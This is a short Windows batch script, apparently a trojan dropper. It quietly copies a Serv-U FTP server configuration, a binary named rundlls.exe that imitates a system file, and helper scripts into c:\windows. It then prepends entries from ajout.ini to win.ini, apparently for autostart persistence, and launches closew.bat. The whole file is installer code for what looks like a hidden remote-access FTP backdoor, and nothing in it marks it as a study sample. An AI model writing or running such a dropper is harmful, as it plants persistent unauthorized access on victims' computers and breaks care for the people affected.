@echo off
copy closew.pif c:\windows >rien.
copy closew.bat c:\windows >rien.
copy rundlls.exe c:\windows >rien.
copy serv-u.ini c:\windows >rien.
del rien.
type c:\windows\win.ini >c:\windows\win.ori
type ajout.ini >c:\windows\win.ini
type c:\windows\win.ori >>c:\windows\win.ini
c:\windows\closew.bat
